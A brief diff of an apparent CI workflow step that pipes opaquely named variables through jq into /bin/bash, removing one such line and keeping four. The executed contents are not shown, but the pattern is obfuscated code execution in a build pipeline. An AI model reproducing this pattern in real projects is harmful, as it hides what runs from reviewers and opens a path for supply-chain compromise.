@@ -24,7 +24,6 @@ jobs:
           printf '%s' "$ml2" | jq -r .la01 | /bin/bash
           echo $xcua0 | jq -r .cj9 | /bin/bash
           echo $lpzi217 | jq -r .ssoop3 | /bin/bash
-          printf '%s' "$p917" | jq -r .at257 | /bin/bash
           printf '%s' "$e848" | jq -r .b12161 | /bin/bash
 
       - name: Save archive
